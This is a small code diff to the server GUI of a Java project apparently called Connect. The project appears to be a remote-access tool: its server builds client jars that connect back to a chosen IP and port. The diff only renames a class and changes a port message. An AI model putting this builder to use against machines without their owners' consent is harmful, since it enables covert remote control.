@@ -4,7 +4,7 @@ package br.com.introcdc.connect.server.gui;
  */
 
 import br.com.introcdc.connect.Connect;
-import br.com.introcdc.connect.client.components.FileComponents;
+import br.com.introcdc.connect.client.components.ClientFileComponents;
 import br.com.introcdc.connect.server.ConnectServer;
 import br.com.introcdc.connect.server.components.ServerAudioComponents;
 import br.com.introcdc.connect.server.components.ServerControlComponents;
@@ -356,13 +356,13 @@ public class ServerGUI extends JFrame {
                     this, "Digite o IP que irá conectar (vazio = " + Connect.IP + ")", "IP", JOptionPane.PLAIN_MESSAGE);
             String selected = userInput != null && !userInput.trim().isEmpty() ? userInput.trim() : Connect.IP;
 
-            String fileName = FileComponents.getFileName();
+            String fileName = ClientFileComponents.getFileName();
             if (fileName.isEmpty()) {
                 Connect.saveJar(new File("target/Connect.jar"), selected);
             } else {
                 Connect.saveJar(new File(fileName), selected);
             }
-            JOptionPane.showMessageDialog(this, "Build para o IP " + selected + " criada!\nPortas usadas: 12345 até 12355!", "Sucesso", JOptionPane.INFORMATION_MESSAGE);
+            JOptionPane.showMessageDialog(this, "Build para o IP " + selected + " criada!\nPorta: " + Connect.PORT, "Sucesso", JOptionPane.INFORMATION_MESSAGE);
             try {
                 Desktop.getDesktop().open(new File("connect"));
             } catch (Exception ex) {
